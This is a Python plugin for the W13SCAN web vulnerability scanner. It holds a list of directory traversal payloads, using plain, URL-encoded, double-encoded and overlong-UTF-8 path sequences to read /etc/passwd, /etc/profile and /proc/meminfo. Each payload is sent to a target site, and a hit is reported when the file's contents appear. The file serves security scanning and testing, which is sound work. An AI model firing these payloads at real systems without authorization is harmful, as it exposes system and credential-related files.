#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/21 3:53 PM
# @Author  : w8ay
# @File    : directory_traversal.py
import requests

from W13SCAN.lib.const import Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    desc = '''收集自BBScan的目录穿越插件'''
    name = "目录穿越扫描插件"
    level = Level.LOW

    def generate(self):
        payloads = [{'path': '/etc/passwd', 'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
                    {'path': '/proc/meminfo', 'tag': 'MemTotal', 'content-type': '', 'content-type_no': ''},
                    {'path': '/etc/profile', 'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''},
                    {'path': '/file:///etc/passwd', 'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
                    {'path': '/../../../../../../../../../../../../../etc/passwd', 'tag': 'root:x:', 'content-type': '',
                     'content-type_no': ''},
                    {'path': '/../../../../../../../../../../../../../etc/profile', 'tag': '/etc/profile.d/*.sh',
                     'content-type': '', 'content-type_no': ''},
                    {'path': '//././././././././././././././././././././././././../../../../../../../../etc/profile',
                     'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''}, {
                        'path': '/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile',
                        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''}, {
                        'path': '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile',
                        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''},
                    {'path': '/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', 'tag': 'root:x:',
                     'content-type': '', 'content-type_no': ''},
                    {'path': '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd',
                     'tag': 'root:x:', 'content-type': '', 'content-type_no': ''}, {
                        'path': '/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                        'tag': 'root:x:', 'content-type': '', 'content-type_no': ''},
                    {'path': '/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd', 'tag': 'root:x:',
                     'content-type': '', 'content-type_no': ''}]
        return payloads

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        domain = "{}://{}/".format(p.scheme, p.netloc)
        payloads = self.generate()

        if self.response.system != "*NIX" and self.response.system:
            return

        for payload in payloads:
            test_url = domain.rstrip('/') + payload["path"]
            r = requests.get(test_url, headers=headers)
            if r.status_code != 200:
                continue
            if payload["tag"]:
                if payload["tag"] not in r.text:
                    continue
            if payload["content-type"]:
                if payload['content-type'] not in r.headers.get('Content-Type', ''):
                    continue
            if payload["content-type_no"]:
                if payload["content-type_no"] in r.headers.get('Content-Type', ''):
                    continue
            out.success(test_url, self.name)
